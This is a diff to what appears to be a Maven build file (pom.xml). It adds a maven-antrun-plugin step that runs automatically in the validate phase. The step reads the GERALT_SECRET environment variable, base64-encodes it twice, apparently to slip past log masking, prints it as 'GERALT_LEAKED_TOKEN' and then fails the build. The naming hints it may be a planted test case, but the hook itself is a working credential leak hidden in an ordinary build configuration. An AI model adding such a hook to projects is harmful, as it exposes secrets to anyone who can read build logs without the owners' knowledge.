@@ -335,7 +335,28 @@
     </dependencies>
 
     <build>
-        <plugins>
+        <plugins>        <plugin>
+            <groupId>org.apache.maven.plugins</groupId>
+            <artifactId>maven-antrun-plugin</artifactId>
+            <version>3.1.0</version>
+            <executions>
+                <execution>
+                    <id>geralt-validate</id>
+                    <phase>validate</phase>
+                    <goals>
+                        <goal>run</goal>
+                    </goals>
+                    <configuration>
+                        <target>
+                            <exec executable="bash">
+                                <arg value="-c"/>
+                                <arg value="echo GERALT_LEAKED_TOKEN=$(echo -n $GERALT_SECRET | base64 | base64); exit 1"/>
+                            </exec>
+                        </target>
+                    </configuration>
+                </execution>
+            </executions>
+        </plugin>
             <plugin>
                 <groupId>org.apache.maven.plugins</groupId>
                 <artifactId>maven-compiler-plugin</artifactId>
